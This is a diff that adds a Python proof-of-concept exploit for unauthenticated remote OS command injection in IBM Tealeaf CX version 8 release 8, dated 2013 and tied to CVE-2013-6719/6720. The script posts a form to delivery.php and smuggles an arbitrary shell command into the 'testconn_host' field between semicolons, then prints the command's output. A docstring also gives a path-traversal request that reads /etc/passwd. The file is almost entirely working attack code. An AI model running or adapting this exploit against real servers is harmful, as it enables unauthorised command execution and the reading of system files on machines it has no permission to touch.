@@ -1,0 +1,63 @@
+# IBM Tealeaf CX (v8 release 8) Remote OS Command Injection
+# Date: 11/08/2013
+# Exploit author: drone
+# More information: http://www-01.ibm.com/support/docview.wss?uid=swg21667630 
+# Vendor homepage: http://www-01.ibm.com/software/info/tealeaf/
+# Version: Version 8 Release 8 (likely all versions prior)
+# Tested on: Redhat Linux 6.2
+# CVE: CVE-2013-6719 / CVE-2013-6720
+
+import requests
+from argparse import ArgumentParser
+
+""" Remote OS command injection (no auth)
+    IBM TeaLeaf Version 8 Release 8
+    drone (@dronesec)
+
+    Bonus:
+    LFI at /download.php?log=../../etc/passwd
+"""
+
+
+def run(options):
+    access = "http://{0}:{1}/delivery.php".format(options.address, options.port)
+    data = {"perform_action" : "testconn",
+            "delete_id" : "",
+            "testconn_host" : "8.8.8.8 -c 1 ; {0} ; ping 8.8.8.8 -c 1".format(options.cmd),
+            "testconn_port" : 1966,
+            "testconn_t"    : "false",
+            "csrf" : "afe2fce60e94a235511a7397ec5c9a87fb7fc25b", # it doesnt even care
+            "delivery_mode" : 0,
+            "batch_interval" : 60,
+            "polling_interval" : 10,
+            "watchdog_timer" : 30,
+            "max_queue_depth" : 50000000,
+            "timesource_host" : "test",
+            "timesource_port" : 1966,
+            "staticshit_enabled" : "on", # seriously
+            "staticshit_host" : "test",
+            "staticshit_intervalseconds" : 60,
+            "staticshit_port" : 1966
+           }
+
+    response = requests.post(access, data=data, timeout=20.0)
+    if response.status_code == 200:
+        # lazy parsing
+        result = response.content.split("alert('")[1].split('onUnload')[0]
+        for x in result.split("\\n"):
+            if 'PATTERN' in x: break
+            print x
+            
+    
+def parse_args():
+    parser = ArgumentParser()
+    parser.add_argument("-i", help="Server address", action="store",
+                        required=True, dest="address")
+    parser.add_argument("-p", help='Server port', action='store',
+                        dest='port', default=8080)
+    parser.add_argument("-c", help='Command to exec', action='store',
+                        dest='cmd', default='whoami')
+    return parser.parse_args()
+
+if __name__ == "__main__":
+    run(parse_args())
